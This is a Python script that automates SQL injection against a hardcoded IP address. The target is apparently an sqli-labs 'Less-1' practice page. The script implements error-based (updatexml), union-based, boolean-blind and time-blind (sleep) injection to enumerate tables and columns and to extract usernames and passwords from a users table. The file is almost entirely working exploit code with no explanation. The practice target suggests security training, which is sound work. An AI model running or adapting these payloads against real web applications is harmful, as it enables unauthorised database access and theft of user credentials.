import requests
import string
import time


def error_based_sql_injection(sql: str) -> None:
    url = "http://47.115.154.103:8848/Less-1/?id=1' and updatexml(1, (concat(0x7e, ({}))),1) --+".format(sql)
    res = requests.get(url=url)
    if "XPATH syntax error" in res.text:
        data = res.text[res.text.find("XPATH syntax error") + len("XPATH syntax error: "):]
        data = data[:data.find("</font>")]
        print(data)


def error_based_injection():
    sql_tables = "select group_concat(table_name) from information_schema.tables where " \
                 "table_schema=database()"
    error_based_sql_injection(sql_tables)

    sql_columns = "select group_concat(column_name) from information_schema.columns where " \
                  "table_name = 'users'"
    error_based_sql_injection(sql_columns)

    sql_username = "select group_concat(username) from users"
    error_based_sql_injection(sql_username)

    sql_password = "select group_concat(password) from users"
    error_based_sql_injection(sql_password)


def union_based_sql_injection(sql: str) -> None:
    url = "http://47.115.154.103:8848/Less-1/?id=-1' union {};--+".format(sql)
    res = requests.get(url=url)
    symbols = "Your Login name:"
    # print(res.text)
    if symbols in res.text:
        data = res.text[res.text.find(symbols) + len(symbols):]
        data = data[:data.find("<br>")]
        print(data)


def union_based_injection():
    sql_tables = "select 1, group_concat(table_name),3  from information_schema.tables where " \
                 "table_schema=database()"
    union_based_sql_injection(sql_tables)

    sql_columns = "select 1, group_concat(column_name), 3 from information_schema.columns where " \
                  "table_name = 'users'"
    union_based_sql_injection(sql_columns)

    sql_username = "select 1, group_concat(username), 3 from users"
    union_based_sql_injection(sql_username)

    sql_password = "select 1, group_concat(password), 3 from users"
    union_based_sql_injection(sql_password)


def leak_length(which: int):
    urls = []
    url = "http://47.115.154.103:8848/Less-1/?id=-1' or " \
          "{}=(select length(group_concat(table_name)) from information_schema.tables where " \
          "table_schema=database()); --+" \
          ""
    urls.append(url)
    url = "http://47.115.154.103:8848/Less-1/?id=-1' or " \
          "{}=(select length(group_concat(column_name)) from information_schema.columns where " \
          "table_name='users'); --+" \
          ""
    urls.append(url)
    url = "http://47.115.154.103:8848/Less-1/?id=-1' or " \
          "{}=(select length(group_concat(username)) from users); --+" \
          ""
    urls.append(url)
    for i in range(0, 100):
        url = urls[which].format(i)
        res = requests.get(url=url)

        if "Dumb" in res.text:
            print(i, end="")
            break


def leak_table_name():
    for i in range(1, 29 + 1):
        for j in string.printable:
            data = ord(j)
            # print(data)
            url = "http://47.115.154.103:8848/Less-1/?id=-1' or " \
                  "{0}=(select ascii(substr((select group_concat(table_name) " \
                  "from information_schema.tables where " \
                  "table_schema=database()), {1}, 1))); --+".format(data, i)

            res = requests.get(url=url)
            if "Dumb" in res.text:
                print(j, end="")
                break
    print()


def leak_column_name():
    for i in range(1, 20 + 1):
        for j in string.printable:
            data = ord(j)
            url = "http://47.115.154.103:8848/Less-1/?id=-1' or " \
                  "{0}=(select ascii(substr((select group_concat(column_name) " \
                  "from information_schema.columns where " \
                  "table_name='users'), {1}, 1))); --+".format(data, i)
            res = requests.get(url=url)
            if "Dumb" in res.text:
                print(j, end="")
                break
    print()


def leak_data():
    for i in range(1, 9):
        for j in string.printable:
            data = ord(j)
            url = "http://47.115.154.103:8848/Less-1/?id=-1' or " \
                  "{0}=(select ascii(substr((select group_concat(password) " \
                  "from users where " \
                  "username='Dummy'), {1}, 1))); --+".format(data, i)
            res = requests.get(url=url)
            if "Dumb" in res.text:
                print(j, end="")
                break
    print()


def bool_based_sql_injection() -> None:
    # leak_length(0)
    # table_name length == 29
    leak_table_name()
    # leak_length(1)
    # column_name length == 20
    # leak_length(2)
    # column_name_admin length == 91
    # leak_data()
    pass


def bool_based_injection():
    # leak_length()
    bool_based_sql_injection()


def time_based_leak_length(which):
    urls = []
    url = "http://47.115.154.103:8848/Less-1/?id=1' and" \
          " if({}=(select length(group_concat(table_name))" \
          " from information_schema.tables" \
          " where table_schema=database())," \
          " sleep(4), 1); --+"
    urls.append(url)
    url = "http://47.115.154.103:8848/Less-1/?id=1' and" \
          " if({}=(select length(group_concat(column_name))" \
          " from information_schema.columns" \
          " where table_name='users')," \
          " sleep(4), 1); --+"
    urls.append(url)
    url = "http://47.115.154.103:8848/Less-1/?id=1' and" \
          " if({}=(select length(group_concat(password))" \
          " from users" \
          " where username='Dummy')," \
          " sleep(4), 1); --+"
    urls.append(url)
    for i in range(0, 40):
        url = urls[which].format(i)

        try:
            res = requests.get(url=url, timeout=3)

        except:
            print(i)
            break


def time_based_leak_table():
    for i in range(1, 30):
        for j in string.printable:
            data = ord(j)
            url = "http://47.115.154.103:8848/Less-1/?id=1' and " \
                  "if({0}=(select ascii(substr((select group_concat(table_name) " \
                  "from information_schema.tables where " \
                  "table_schema=database()), {1}, 1))), sleep(4), 1); --+".format(data, i)

            try:
                res = requests.get(url=url, timeout=3)

            except:
                print(j, end="")
                break
    print()


def time_based_leak_columns():
    for i in range(1, 21):
        for j in string.printable:
            data = ord(j)
            url = "http://47.115.154.103:8848/Less-1/?id=1' and " \
                  "if({0}=(select ascii(substr((select group_concat(column_name) " \
                  "from information_schema.columns where " \
                  "table_name='users'), {1}, 1))), sleep(4), 1); --+".format(data, i)

            try:
                res = requests.get(url=url, timeout=3)

            except:
                print(j, end="")
                break
    print()


def time_based_leak_data():
    for i in range(1, 9):
        for j in string.printable:
            data = ord(j)
            url = "http://47.115.154.103:8848/Less-1/?id=1' and " \
                  "if({0}=(select ascii(substr((select group_concat(password) " \
                  "from users where " \
                  "username='Dummy'), {1}, 1))), sleep(4), 1); --+".format(data, i)

            try:
                res = requests.get(url=url, timeout=3)

            except:
                print(j, end="")
                break
    print()


def time_based_injection():
    # table_name length == 29
    # time_based_leak_table()
    # time_based_leak_length(0)
    # column_name length == 20
    # time_based_leak_columns()
    # time_based_leak_length()
    # Dummy`s password length == 8
    time_based_leak_data()
    pass
    # time_based_leak_length()


if __name__ == '__main__':
    # error_based_injection()
    # union_based_injection()
    # bool_based_injection()
    time_based_injection()
    pass
